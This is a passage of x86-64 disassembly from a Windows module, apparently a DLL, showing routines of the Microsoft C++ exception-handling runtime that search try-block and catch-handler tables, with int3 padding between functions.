   18000307f:	8b 44 08 04          	mov    0x4(%rax,%rcx,1),%eax
   180003083:	48 83 c4 20          	add    $0x20,%rsp
   180003087:	5b                   	pop    %rbx
   180003088:	c3                   	ret
   180003089:	cc                   	int3
   18000308a:	cc                   	int3
   18000308b:	cc                   	int3
   18000308c:	cc                   	int3
   18000308d:	cc                   	int3
   18000308e:	cc                   	int3
   18000308f:	cc                   	int3
   180003090:	49 63 50 1c          	movslq 0x1c(%r8),%rdx
   180003094:	48 8b 01             	mov    (%rcx),%rax
   180003097:	44 89 0c 02          	mov    %r9d,(%rdx,%rax,1)
   18000309b:	c3                   	ret
   18000309c:	cc                   	int3
   18000309d:	cc                   	int3
   18000309e:	cc                   	int3
   18000309f:	cc                   	int3
   1800030a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800030a5:	57                   	push   %rdi
   1800030a6:	48 83 ec 20          	sub    $0x20,%rsp
   1800030aa:	41 8b f9             	mov    %r9d,%edi
   1800030ad:	49 8b d8             	mov    %r8,%rbx
   1800030b0:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1800030b5:	e8 16 fa ff ff       	call   0x180002ad0
   1800030ba:	48 8b 08             	mov    (%rax),%rcx
   1800030bd:	48 63 43 1c          	movslq 0x1c(%rbx),%rax
   1800030c1:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   1800030c6:	3b 7c 08 04          	cmp    0x4(%rax,%rcx,1),%edi
   1800030ca:	7e 04                	jle    0x1800030d0
   1800030cc:	89 7c 08 04          	mov    %edi,0x4(%rax,%rcx,1)
   1800030d0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800030d5:	48 83 c4 20          	add    $0x20,%rsp
   1800030d9:	5f                   	pop    %rdi
   1800030da:	c3                   	ret
   1800030db:	cc                   	int3
   1800030dc:	cc                   	int3
   1800030dd:	cc                   	int3
   1800030de:	cc                   	int3
   1800030df:	cc                   	int3
   1800030e0:	40 53                	rex push %rbx
   1800030e2:	48 83 ec 20          	sub    $0x20,%rsp
   1800030e6:	48 8b c2             	mov    %rdx,%rax
   1800030e9:	48 85 c9             	test   %rcx,%rcx
   1800030ec:	74 55                	je     0x180003143
   1800030ee:	48 63 59 18          	movslq 0x18(%rcx),%rbx
   1800030f2:	4c 8b 4a 08          	mov    0x8(%rdx),%r9
   1800030f6:	4d 8d 14 19          	lea    (%r9,%rbx,1),%r10
   1800030fa:	4d 85 d2             	test   %r10,%r10
   1800030fd:	74 44                	je     0x180003143
   1800030ff:	44 8b 41 14          	mov    0x14(%rcx),%r8d
   180003103:	45 85 c0             	test   %r8d,%r8d
   180003106:	74 30                	je     0x180003138
   180003108:	4c 8b 18             	mov    (%rax),%r11
   18000310b:	33 d2                	xor    %edx,%edx
   18000310d:	0f 1f 00             	nopl   (%rax)
   180003110:	49 63 0c d2          	movslq (%r10,%rdx,8),%rcx
   180003114:	49 03 c9             	add    %r9,%rcx
   180003117:	4c 3b d9             	cmp    %rcx,%r11
   18000311a:	72 07                	jb     0x180003123
   18000311c:	ff c2                	inc    %edx
   18000311e:	41 3b d0             	cmp    %r8d,%edx
   180003121:	72 ed                	jb     0x180003110
   180003123:	85 d2                	test   %edx,%edx
   180003125:	74 11                	je     0x180003138
   180003127:	8d 42 ff             	lea    -0x1(%rdx),%eax
   18000312a:	49 8d 04 c1          	lea    (%r9,%rax,8),%rax
   18000312e:	8b 44 18 04          	mov    0x4(%rax,%rbx,1),%eax
   180003132:	48 83 c4 20          	add    $0x20,%rsp
   180003136:	5b                   	pop    %rbx
   180003137:	c3                   	ret
   180003138:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   18000313d:	48 83 c4 20          	add    $0x20,%rsp
   180003141:	5b                   	pop    %rbx
   180003142:	c3                   	ret
   180003143:	e8 28 29 00 00       	call   0x180005a70
   180003148:	cc                   	int3
   180003149:	cc                   	int3
   18000314a:	cc                   	int3
   18000314b:	cc                   	int3
   18000314c:	cc                   	int3
   18000314d:	cc                   	int3
   18000314e:	cc                   	int3
   18000314f:	cc                   	int3
   180003150:	40 53                	rex push %rbx
   180003152:	48 83 ec 20          	sub    $0x20,%rsp
   180003156:	48 85 c9             	test   %rcx,%rcx
   180003159:	74 58                	je     0x1800031b3
   18000315b:	48 63 59 18          	movslq 0x18(%rcx),%rbx
   18000315f:	4c 8b 52 08          	mov    0x8(%rdx),%r10
   180003163:	4d 8d 1c 1a          	lea    (%r10,%rbx,1),%r11
   180003167:	4d 85 db             	test   %r11,%r11
   18000316a:	74 47                	je     0x1800031b3
   18000316c:	44 8b 49 14          	mov    0x14(%rcx),%r9d
   180003170:	45 85 c9             	test   %r9d,%r9d
   180003173:	74 33                	je     0x1800031a8
   180003175:	33 d2                	xor    %edx,%edx
   180003177:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000317e:	00 00 
   180003180:	49 63 0c d3          	movslq (%r11,%rdx,8),%rcx
   180003184:	49 03 ca             	add    %r10,%rcx
   180003187:	4c 3b c1             	cmp    %rcx,%r8
   18000318a:	72 07                	jb     0x180003193
   18000318c:	ff c2                	inc    %edx
   18000318e:	41 3b d1             	cmp    %r9d,%edx
   180003191:	72 ed                	jb     0x180003180
   180003193:	85 d2                	test   %edx,%edx
   180003195:	74 11                	je     0x1800031a8
   180003197:	8d 4a ff             	lea    -0x1(%rdx),%ecx
   18000319a:	49 8d 04 ca          	lea    (%r10,%rcx,8),%rax
   18000319e:	8b 44 18 04          	mov    0x4(%rax,%rbx,1),%eax
   1800031a2:	48 83 c4 20          	add    $0x20,%rsp
   1800031a6:	5b                   	pop    %rbx
   1800031a7:	c3                   	ret
   1800031a8:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1800031ad:	48 83 c4 20          	add    $0x20,%rsp
   1800031b1:	5b                   	pop    %rbx
   1800031b2:	c3                   	ret
   1800031b3:	e8 b8 28 00 00       	call   0x180005a70
   1800031b8:	cc                   	int3
   1800031b9:	cc                   	int3
   1800031ba:	cc                   	int3
   1800031bb:	cc                   	int3
   1800031bc:	cc                   	int3
   1800031bd:	cc                   	int3
   1800031be:	cc                   	int3
   1800031bf:	cc                   	int3
   1800031c0:	40 53                	rex push %rbx
   1800031c2:	56                   	push   %rsi
   1800031c3:	57                   	push   %rdi
   1800031c4:	41 56                	push   %r14
   1800031c6:	41 57                	push   %r15
   1800031c8:	48 83 ec 30          	sub    $0x30,%rsp
   1800031cc:	4d 8b f1             	mov    %r9,%r14
   1800031cf:	49 8b d8             	mov    %r8,%rbx
   1800031d2:	48 8b fa             	mov    %rdx,%rdi
   1800031d5:	4c 8b f9             	mov    %rcx,%r15
   1800031d8:	49 63 70 04          	movslq 0x4(%r8),%rsi
   1800031dc:	85 f6                	test   %esi,%esi
   1800031de:	0f 84 8e 01 00 00    	je     0x180003372
   1800031e4:	e8 e7 fc ff ff       	call   0x180002ed0
   1800031e9:	48 03 c6             	add    %rsi,%rax
   1800031ec:	0f 84 80 01 00 00    	je     0x180003372
   1800031f2:	48 63 73 04          	movslq 0x4(%rbx),%rsi
   1800031f6:	85 f6                	test   %esi,%esi
   1800031f8:	74 0c                	je     0x180003206
   1800031fa:	e8 d1 fc ff ff       	call   0x180002ed0
   1800031ff:	48 03 c6             	add    %rsi,%rax
   180003202:	33 f6                	xor    %esi,%esi
   180003204:	eb 04                	jmp    0x18000320a
   180003206:	33 f6                	xor    %esi,%esi
   180003208:	8b c6                	mov    %esi,%eax
   18000320a:	80 78 10 00          	cmpb   $0x0,0x10(%rax)
   18000320e:	0f 84 5e 01 00 00    	je     0x180003372
   180003214:	48 63 43 08          	movslq 0x8(%rbx),%rax
   180003218:	85 c0                	test   %eax,%eax
   18000321a:	75 08                	jne    0x180003224
   18000321c:	39 03                	cmp    %eax,(%rbx)
   18000321e:	0f 8d 4e 01 00 00    	jge    0x180003372
   180003224:	8b 0b                	mov    (%rbx),%ecx
   180003226:	85 c9                	test   %ecx,%ecx
   180003228:	78 06                	js     0x180003230
   18000322a:	48 03 07             	add    (%rdi),%rax
   18000322d:	48 8b f8             	mov    %rax,%rdi
   180003230:	84 c9                	test   %cl,%cl
   180003232:	79 41                	jns    0x180003275
   180003234:	41 f6 06 10          	testb  $0x10,(%r14)
   180003238:	74 3b                	je     0x180003275
   18000323a:	48 8b 05 d7 78 01 00 	mov    0x178d7(%rip),%rax        # 0x18001ab18
   180003241:	48 85 c0             	test   %rax,%rax
   180003244:	74 2f                	je     0x180003275
   180003246:	ff 15 0c c0 00 00    	call   *0xc00c(%rip)        # 0x18000f258
   18000324c:	48 85 c0             	test   %rax,%rax
   18000324f:	0f 84 2b 01 00 00    	je     0x180003380
   180003255:	48 85 ff             	test   %rdi,%rdi
   180003258:	0f 84 22 01 00 00    	je     0x180003380
   18000325e:	48 89 07             	mov    %rax,(%rdi)
   180003261:	49 8d 56 08          	lea    0x8(%r14),%rdx
   180003265:	48 8b c8             	mov    %rax,%rcx
   180003268:	e8 53 f1 ff ff       	call   0x1800023c0
   18000326d:	48 89 07             	mov    %rax,(%rdi)
   180003270:	e9 ef 00 00 00       	jmp    0x180003364
   180003275:	f6 c1 08             	test   $0x8,%cl
   180003278:	74 2a                	je     0x1800032a4
   18000327a:	49 8b 4f 28          	mov    0x28(%r15),%rcx
   18000327e:	48 85 c9             	test   %rcx,%rcx
   180003281:	0f 84 fe 00 00 00    	je     0x180003385
   180003287:	48 85 ff             	test   %rdi,%rdi
   18000328a:	0f 84 f5 00 00 00    	je     0x180003385
   180003290:	48 89 0f             	mov    %rcx,(%rdi)
   180003293:	49 8d 56 08          	lea    0x8(%r14),%rdx
   180003297:	e8 24 f1 ff ff       	call   0x1800023c0
   18000329c:	48 89 07             	mov    %rax,(%rdi)
   18000329f:	e9 c0 00 00 00       	jmp    0x180003364
   1800032a4:	41 f6 06 01          	testb  $0x1,(%r14)
   1800032a8:	74 47                	je     0x1800032f1
   1800032aa:	49 8b 57 28          	mov    0x28(%r15),%rdx
   1800032ae:	48 85 d2             	test   %rdx,%rdx
   1800032b1:	0f 84 d3 00 00 00    	je     0x18000338a
   1800032b7:	48 85 ff             	test   %rdi,%rdi
   1800032ba:	0f 84 ca 00 00 00    	je     0x18000338a
   1800032c0:	4d 63 46 14          	movslq 0x14(%r14),%r8
   1800032c4:	48 8b cf             	mov    %rdi,%rcx
   1800032c7:	e8 a4 9f 00 00       	call   0x18000d270
   1800032cc:	41 83 7e 14 08       	cmpl   $0x8,0x14(%r14)
   1800032d1:	0f 85 8d 00 00 00    	jne    0x180003364
   1800032d7:	48 8b 0f             	mov    (%rdi),%rcx
   1800032da:	48 85 c9             	test   %rcx,%rcx
   1800032dd:	0f 84 81 00 00 00    	je     0x180003364
   1800032e3:	49 8d 56 08          	lea    0x8(%r14),%rdx
   1800032e7:	e8 d4 f0 ff ff       	call   0x1800023c0
   1800032ec:	48 89 07             	mov    %rax,(%rdi)
   1800032ef:	eb 73                	jmp    0x180003364
   1800032f1:	49 63 5e 18          	movslq 0x18(%r14),%rbx
   1800032f5:	85 db                	test   %ebx,%ebx
   1800032f7:	74 0b                	je     0x180003304
   1800032f9:	e8 f2 fb ff ff       	call   0x180002ef0
   1800032fe:	48 8d 14 18          	lea    (%rax,%rbx,1),%rdx
   180003302:	eb 03                	jmp    0x180003307
   180003304:	48 8b d6             	mov    %rsi,%rdx
   180003307:	49 8b 47 28          	mov    0x28(%r15),%rax
   18000330b:	48 85 d2             	test   %rdx,%rdx
   18000330e:	75 2a                	jne    0x18000333a
   180003310:	48 85 c0             	test   %rax,%rax
   180003313:	74 7a                	je     0x18000338f
   180003315:	48 85 ff             	test   %rdi,%rdi
   180003318:	74 75                	je     0x18000338f
   18000331a:	49 63 5e 14          	movslq 0x14(%r14),%rbx
   18000331e:	49 8d 56 08          	lea    0x8(%r14),%rdx
   180003322:	48 8b c8             	mov    %rax,%rcx
   180003325:	e8 96 f0 ff ff       	call   0x1800023c0
   18000332a:	48 8b d0             	mov    %rax,%rdx
   18000332d:	4c 8b c3             	mov    %rbx,%r8
   180003330:	48 8b cf             	mov    %rdi,%rcx
   180003333:	e8 38 9f 00 00       	call   0x18000d270
   180003338:	eb 2a                	jmp    0x180003364
   18000333a:	48 85 c0             	test   %rax,%rax
   18000333d:	74 55                	je     0x180003394
   18000333f:	48 85 ff             	test   %rdi,%rdi
   180003342:	74 50                	je     0x180003394
   180003344:	49 63 5e 18          	movslq 0x18(%r14),%rbx
   180003348:	85 db                	test   %ebx,%ebx
   18000334a:	74 48                	je     0x180003394
   18000334c:	e8 9f fb ff ff       	call   0x180002ef0
   180003351:	48 03 c3             	add    %rbx,%rax
   180003354:	74 3e                	je     0x180003394
   180003356:	41 f6 06 04          	testb  $0x4,(%r14)
   18000335a:	40 0f 95 c6          	setne  %sil
   18000335e:	ff c6                	inc    %esi
   180003360:	89 74 24 20          	mov    %esi,0x20(%rsp)
   180003364:	8b c6                	mov    %esi,%eax
   180003366:	48 83 c4 30          	add    $0x30,%rsp
   18000336a:	41 5f                	pop    %r15
   18000336c:	41 5e                	pop    %r14
   18000336e:	5f                   	pop    %rdi
   18000336f:	5e                   	pop    %rsi
   180003370:	5b                   	pop    %rbx
   180003371:	c3                   	ret
   180003372:	33 c0                	xor    %eax,%eax
   180003374:	48 83 c4 30          	add    $0x30,%rsp
   180003378:	41 5f                	pop    %r15
   18000337a:	41 5e                	pop    %r14
   18000337c:	5f                   	pop    %rdi
   18000337d:	5e                   	pop    %rsi
   18000337e:	5b                   	pop    %rbx
   18000337f:	c3                   	ret
   180003380:	e8 eb 26 00 00       	call   0x180005a70
   180003385:	e8 e6 26 00 00       	call   0x180005a70
   18000338a:	e8 e1 26 00 00       	call   0x180005a70
   18000338f:	e8 dc 26 00 00       	call   0x180005a70
   180003394:	e8 d7 26 00 00       	call   0x180005a70
   180003399:	90                   	nop
   18000339a:	e8 d1 26 00 00       	call   0x180005a70
   18000339f:	90                   	nop
   1800033a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800033a5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800033aa:	57                   	push   %rdi
   1800033ab:	48 83 ec 20          	sub    $0x20,%rsp
   1800033af:	49 8b f9             	mov    %r9,%rdi
   1800033b2:	48 8b f1             	mov    %rcx,%rsi
   1800033b5:	41 83 38 00          	cmpl   $0x0,(%r8)
   1800033b9:	7d 05                	jge    0x1800033c0
   1800033bb:	48 8b da             	mov    %rdx,%rbx
   1800033be:	eb 07                	jmp    0x1800033c7
   1800033c0:	49 63 58 08          	movslq 0x8(%r8),%rbx
   1800033c4:	48 03 1a             	add    (%rdx),%rbx
   1800033c7:	e8 f4 fd ff ff       	call   0x1800031c0
   1800033cc:	83 e8 01             	sub    $0x1,%eax
   1800033cf:	74 3f                	je     0x180003410
   1800033d1:	83 f8 01             	cmp    $0x1,%eax
   1800033d4:	75 6d                	jne    0x180003443
   1800033d6:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   1800033da:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
   1800033de:	e8 dd ef ff ff       	call   0x1800023c0
   1800033e3:	48 8b f0             	mov    %rax,%rsi
   1800033e6:	48 63 7f 18          	movslq 0x18(%rdi),%rdi
   1800033ea:	85 ff                	test   %edi,%edi
   1800033ec:	74 0a                	je     0x1800033f8
   1800033ee:	e8 fd fa ff ff       	call   0x180002ef0
   1800033f3:	48 03 c7             	add    %rdi,%rax
   1800033f6:	eb 02                	jmp    0x1800033fa
   1800033f8:	33 c0                	xor    %eax,%eax
   1800033fa:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   180003400:	4c 8b c6             	mov    %rsi,%r8
   180003403:	48 8b d0             	mov    %rax,%rdx
   180003406:	48 8b cb             	mov    %rbx,%rcx
   180003409:	e8 f2 12 00 00       	call   0x180004700
   18000340e:	eb 33                	jmp    0x180003443
   180003410:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   180003414:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
   180003418:	e8 a3 ef ff ff       	call   0x1800023c0
   18000341d:	48 8b f0             	mov    %rax,%rsi
   180003420:	48 63 7f 18          	movslq 0x18(%rdi),%rdi
   180003424:	85 ff                	test   %edi,%edi
   180003426:	74 0a                	je     0x180003432
   180003428:	e8 c3 fa ff ff       	call   0x180002ef0
   18000342d:	48 03 c7             	add    %rdi,%rax
   180003430:	eb 02                	jmp    0x180003434
   180003432:	33 c0                	xor    %eax,%eax
   180003434:	4c 8b c6             	mov    %rsi,%r8
   180003437:	48 8b d0             	mov    %rax,%rdx
   18000343a:	48 8b cb             	mov    %rbx,%rcx
   18000343d:	e8 ae 12 00 00       	call   0x1800046f0
   180003442:	90                   	nop
   180003443:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003448:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000344d:	48 83 c4 20          	add    $0x20,%rsp
   180003451:	5f                   	pop    %rdi
   180003452:	c3                   	ret
   180003453:	e8 18 26 00 00       	call   0x180005a70
   180003458:	90                   	nop
   180003459:	cc                   	int3
   18000345a:	cc                   	int3
   18000345b:	cc                   	int3
   18000345c:	cc                   	int3
   18000345d:	cc                   	int3
   18000345e:	cc                   	int3
   18000345f:	cc                   	int3
   180003460:	40 53                	rex push %rbx
   180003462:	55                   	push   %rbp
   180003463:	56                   	push   %rsi
   180003464:	57                   	push   %rdi
   180003465:	41 55                	push   %r13
   180003467:	41 56                	push   %r14
   180003469:	41 57                	push   %r15
   18000346b:	48 81 ec 00 01 00 00 	sub    $0x100,%rsp
   180003472:	48 8b 05 87 6b 01 00 	mov    0x16b87(%rip),%rax        # 0x18001a000
   180003479:	48 33 c4             	xor    %rsp,%rax
   18000347c:	48 89 84 24 e0 00 00 	mov    %rax,0xe0(%rsp)
   180003483:	00 
   180003484:	4c 8b bc 24 60 01 00 	mov    0x160(%rsp),%r15
   18000348b:	00 
   18000348c:	4c 8b f2             	mov    %rdx,%r14
   18000348f:	48 8b bc 24 78 01 00 	mov    0x178(%rsp),%rdi
   180003496:	00 
   180003497:	48 8b e9             	mov    %rcx,%rbp
   18000349a:	48 89 94 24 80 00 00 	mov    %rdx,0x80(%rsp)
   1800034a1:	00 
   1800034a2:	49 8b cf             	mov    %r15,%rcx
   1800034a5:	49 8b d1             	mov    %r9,%rdx
   1800034a8:	4c 89 44 24 68       	mov    %r8,0x68(%rsp)
   1800034ad:	4d 8b e9             	mov    %r9,%r13
   1800034b0:	49 8b f0             	mov    %r8,%rsi
   1800034b3:	e8 28 fc ff ff       	call   0x1800030e0
   1800034b8:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   1800034bd:	89 44 24 60          	mov    %eax,0x60(%rsp)
   1800034c1:	4d 8b c7             	mov    %r15,%r8
   1800034c4:	49 8b d5             	mov    %r13,%rdx
   1800034c7:	49 8b ce             	mov    %r14,%rcx
   1800034ca:	8b d8                	mov    %eax,%ebx
   1800034cc:	e8 ff f5 ff ff       	call   0x180002ad0
   1800034d1:	4d 8b c7             	mov    %r15,%r8
   1800034d4:	49 8b d5             	mov    %r13,%rdx
   1800034d7:	49 8b ce             	mov    %r14,%rcx
   1800034da:	e8 81 fb ff ff       	call   0x180003060
   1800034df:	4d 8b c7             	mov    %r15,%r8
   1800034e2:	49 8b d5             	mov    %r13,%rdx
   1800034e5:	3b d8                	cmp    %eax,%ebx
   1800034e7:	7e 20                	jle    0x180003509
   1800034e9:	44 8b cb             	mov    %ebx,%r9d
   1800034ec:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1800034f1:	e8 9a fb ff ff       	call   0x180003090
   1800034f6:	44 8b cb             	mov    %ebx,%r9d
   1800034f9:	4d 8b c7             	mov    %r15,%r8
   1800034fc:	49 8b d5             	mov    %r13,%rdx
   1800034ff:	49 8b ce             	mov    %r14,%rcx
   180003502:	e8 99 fb ff ff       	call   0x1800030a0
   180003507:	eb 0e                	jmp    0x180003517
   180003509:	49 8b ce             	mov    %r14,%rcx
   18000350c:	e8 4f fb ff ff       	call   0x180003060
   180003511:	8b d8                	mov    %eax,%ebx
   180003513:	89 44 24 60          	mov    %eax,0x60(%rsp)
   180003517:	4c 89 a4 24 f8 00 00 	mov    %r12,0xf8(%rsp)
   18000351e:	00 
   18000351f:	83 fb ff             	cmp    $0xffffffff,%ebx
   180003522:	0f 8c d9 04 00 00    	jl     0x180003a01
   180003528:	41 3b 5f 04          	cmp    0x4(%r15),%ebx
   18000352c:	0f 8d cf 04 00 00    	jge    0x180003a01
   180003532:	45 33 e4             	xor    %r12d,%r12d
   180003535:	81 7d 00 63 73 6d e0 	cmpl   $0xe06d7363,0x0(%rbp)
   18000353c:	0f 85 c8 00 00 00    	jne    0x18000360a
   180003542:	83 7d 18 04          	cmpl   $0x4,0x18(%rbp)
   180003546:	0f 85 be 00 00 00    	jne    0x18000360a
   18000354c:	8b 45 20             	mov    0x20(%rbp),%eax
   18000354f:	2d 20 05 93 19       	sub    $0x19930520,%eax
   180003554:	83 f8 02             	cmp    $0x2,%eax
   180003557:	0f 87 ad 00 00 00    	ja     0x18000360a
   18000355d:	4c 39 65 30          	cmp    %r12,0x30(%rbp)
   180003561:	0f 85 a3 00 00 00    	jne    0x18000360a
   180003567:	e8 34 f0 ff ff       	call   0x1800025a0
   18000356c:	4c 39 60 20          	cmp    %r12,0x20(%rax)
   180003570:	0f 84 12 04 00 00    	je     0x180003988
   180003576:	e8 25 f0 ff ff       	call   0x1800025a0
   18000357b:	48 8b 68 20          	mov    0x20(%rax),%rbp
   18000357f:	e8 1c f0 ff ff       	call   0x1800025a0
   180003584:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   180003588:	48 8b 70 28          	mov    0x28(%rax),%rsi
   18000358c:	48 89 74 24 68       	mov    %rsi,0x68(%rsp)
   180003591:	e8 9a f9 ff ff       	call   0x180002f30
   180003596:	48 85 ed             	test   %rbp,%rbp
   180003599:	0f 84 62 04 00 00    	je     0x180003a01
   18000359f:	81 7d 00 63 73 6d e0 	cmpl   $0xe06d7363,0x0(%rbp)
   1800035a6:	75 1d                	jne    0x1800035c5
   1800035a8:	83 7d 18 04          	cmpl   $0x4,0x18(%rbp)
   1800035ac:	75 17                	jne    0x1800035c5
   1800035ae:	8b 45 20             	mov    0x20(%rbp),%eax
   1800035b1:	2d 20 05 93 19       	sub    $0x19930520,%eax
   1800035b6:	83 f8 02             	cmp    $0x2,%eax
   1800035b9:	77 0a                	ja     0x1800035c5
   1800035bb:	4c 39 65 30          	cmp    %r12,0x30(%rbp)
   1800035bf:	0f 84 3c 04 00 00    	je     0x180003a01
   1800035c5:	e8 d6 ef ff ff       	call   0x1800025a0
   1800035ca:	4c 39 60 38          	cmp    %r12,0x38(%rax)
   1800035ce:	74 3a                	je     0x18000360a
   1800035d0:	e8 cb ef ff ff       	call   0x1800025a0
   1800035d5:	48 8b 58 38          	mov    0x38(%rax),%rbx
   1800035d9:	e8 c2 ef ff ff       	call   0x1800025a0
   1800035de:	48 8b d3             	mov    %rbx,%rdx
   1800035e1:	48 8b cd             	mov    %rbp,%rcx
   1800035e4:	4c 89 60 38          	mov    %r12,0x38(%rax)
   1800035e8:	e8 63 0f 00 00       	call   0x180004550
   1800035ed:	84 c0                	test   %al,%al
   1800035ef:	75 15                	jne    0x180003606
   1800035f1:	48 8b cb             	mov    %rbx,%rcx
   1800035f4:	e8 67 10 00 00       	call   0x180004660
   1800035f9:	84 c0                	test   %al,%al
   1800035fb:	0f 84 dd 03 00 00    	je     0x1800039de
   180003601:	e9 ac 03 00 00       	jmp    0x1800039b2
   180003606:	8b 5c 24 60          	mov    0x60(%rsp),%ebx
   18000360a:	49 8b 45 08          	mov    0x8(%r13),%rax
   18000360e:	48 89 84 24 a0 00 00 	mov    %rax,0xa0(%rsp)
   180003615:	00 
   180003616:	4c 89 bc 24 98 00 00 	mov    %r15,0x98(%rsp)
   18000361d:	00 
   18000361e:	81 7d 00 63 73 6d e0 	cmpl   $0xe06d7363,0x0(%rbp)
   180003625:	0f 85 13 03 00 00    	jne    0x18000393e
   18000362b:	83 7d 18 04          	cmpl   $0x4,0x18(%rbp)
   18000362f:	0f 85 09 03 00 00    	jne    0x18000393e
   180003635:	8b 45 20             	mov    0x20(%rbp),%eax
   180003638:	2d 20 05 93 19       	sub    $0x19930520,%eax
   18000363d:	83 f8 02             	cmp    $0x2,%eax
   180003640:	0f 87 f8 02 00 00    	ja     0x18000393e
   180003646:	45 39 67 0c          	cmp    %r12d,0xc(%r15)
   18000364a:	0f 86 1f 02 00 00    	jbe    0x18000386f
   180003650:	8b 84 24 70 01 00 00 	mov    0x170(%rsp),%eax
   180003657:	48 8d 94 24 98 00 00 	lea    0x98(%rsp),%rdx
   18000365e:	00 
   18000365f:	89 44 24 28          	mov    %eax,0x28(%rsp)
   180003663:	48 8d 8c 24 a8 00 00 	lea    0xa8(%rsp),%rcx
   18000366a:	00 
   18000366b:	4d 8b cd             	mov    %r13,%r9
   18000366e:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   180003673:	44 8b c3             	mov    %ebx,%r8d
   180003676:	e8 55 f5 ff ff       	call   0x180002bd0
   18000367b:	44 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%r8d
   180003682:	00 
   180003683:	4c 8b 8c 24 a8 00 00 	mov    0xa8(%rsp),%r9
   18000368a:	00 
   18000368b:	4c 89 4c 24 70       	mov    %r9,0x70(%rsp)
   180003690:	44 89 44 24 64       	mov    %r8d,0x64(%rsp)
   180003695:	44 3b 84 24 c0 00 00 	cmp    0xc0(%rsp),%r8d
   18000369c:	00 
   18000369d:	0f 83 cc 01 00 00    	jae    0x18000386f
   1800036a3:	0f 1f 40 00          	nopl   0x0(%rax)
   1800036a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1800036ae:	00 00 
   1800036b0:	49 8b 01             	mov    (%r9),%rax
   1800036b3:	48 63 50 10          	movslq 0x10(%rax),%rdx
   1800036b7:	41 8b c0             	mov    %r8d,%eax
   1800036ba:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1800036be:	49 8b 41 08          	mov    0x8(%r9),%rax
   1800036c2:	48 8d 14 8a          	lea    (%rdx,%rcx,4),%rdx
   1800036c6:	8b 0c 02             	mov    (%rdx,%rax,1),%ecx
   1800036c9:	89 4c 24 7c          	mov    %ecx,0x7c(%rsp)
   1800036cd:	3b cb                	cmp    %ebx,%ecx
   1800036cf:	0f 8f 81 01 00 00    	jg     0x180003856
   1800036d5:	3b 5c 02 04          	cmp    0x4(%rdx,%rax,1),%ebx
   1800036d9:	0f 8f 77 01 00 00    	jg     0x180003856
   1800036df:	8b 4c 02 08          	mov    0x8(%rdx,%rax,1),%ecx
   1800036e3:	45 33 f6             	xor    %r14d,%r14d
   1800036e6:	44 8b 64 02 0c       	mov    0xc(%rdx,%rax,1),%r12d
   1800036eb:	48 63 54 02 10       	movslq 0x10(%rdx,%rax,1),%rdx
   1800036f0:	49 03 55 08          	add    0x8(%r13),%rdx
   1800036f4:	89 4c 24 78          	mov    %ecx,0x78(%rsp)
   1800036f8:	48 89 94 24 88 00 00 	mov    %rdx,0x88(%rsp)
   1800036ff:	00 
   180003700:	45 85 e4             	test   %r12d,%r12d
   180003703:	0f 84 45 01 00 00    	je     0x18000384e
   180003709:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180003710:	4b 8d 0c b6          	lea    (%r14,%r14,4),%rcx
   180003714:	0f 10 04 8a          	movups (%rdx,%rcx,4),%xmm0
   180003718:	0f 11 84 24 c8 00 00 	movups %xmm0,0xc8(%rsp)
   18000371f:	00 
   180003720:	8b 44 8a 10          	mov    0x10(%rdx,%rcx,4),%eax
   180003724:	89 84 24 d8 00 00 00 	mov    %eax,0xd8(%rsp)
   18000372b:	48 8b 45 30          	mov    0x30(%rbp),%rax
   18000372f:	48 63 70 0c          	movslq 0xc(%rax),%rsi
   180003733:	e8 b8 f7 ff ff       	call   0x180002ef0
   180003738:	48 83 c0 04          	add    $0x4,%rax
   18000373c:	48 03 f0             	add    %rax,%rsi
   18000373f:	48 8b 45 30          	mov    0x30(%rbp),%rax
   180003743:	48 63 58 0c          	movslq 0xc(%rax),%rbx
   180003747:	e8 a4 f7 ff ff       	call   0x180002ef0
   18000374c:	8b 1c 18             	mov    (%rax,%rbx,1),%ebx
   18000374f:	85 db                	test   %ebx,%ebx
   180003751:	7e 2d                	jle    0x180003780
   180003753:	48 63 3e             	movslq (%rsi),%rdi
   180003756:	e8 95 f7 ff ff       	call   0x180002ef0
   18000375b:	4c 8b 45 30          	mov    0x30(%rbp),%r8
   18000375f:	48 8d 8c 24 c8 00 00 	lea    0xc8(%rsp),%rcx
   180003766:	00 
   180003767:	48 03 f8             	add    %rax,%rdi
   18000376a:	48 8b d7             	mov    %rdi,%rdx
   18000376d:	e8 fe 04 00 00       	call   0x180003c70
   180003772:	85 c0                	test   %eax,%eax
   180003774:	75 23                	jne    0x180003799
   180003776:	ff cb                	dec    %ebx
   180003778:	48 83 c6 04          	add    $0x4,%rsi
   18000377c:	85 db                	test   %ebx,%ebx
   18000377e:	7f d3                	jg     0x180003753
   180003780:	41 ff c6             	inc    %r14d
   180003783:	45 3b f4             	cmp    %r12d,%r14d
   180003786:	0f 84 b4 00 00 00    	je     0x180003840
   18000378c:	48 8b 94 24 88 00 00 	mov    0x88(%rsp),%rdx
   180003793:	00 
   180003794:	e9 77 ff ff ff       	jmp    0x180003710
   180003799:	4c 8b b4 24 80 00 00 	mov    0x80(%rsp),%r14
   1800037a0:	00 
   1800037a1:	4c 8d 8c 24 90 00 00 	lea    0x90(%rsp),%r9
   1800037a8:	00 
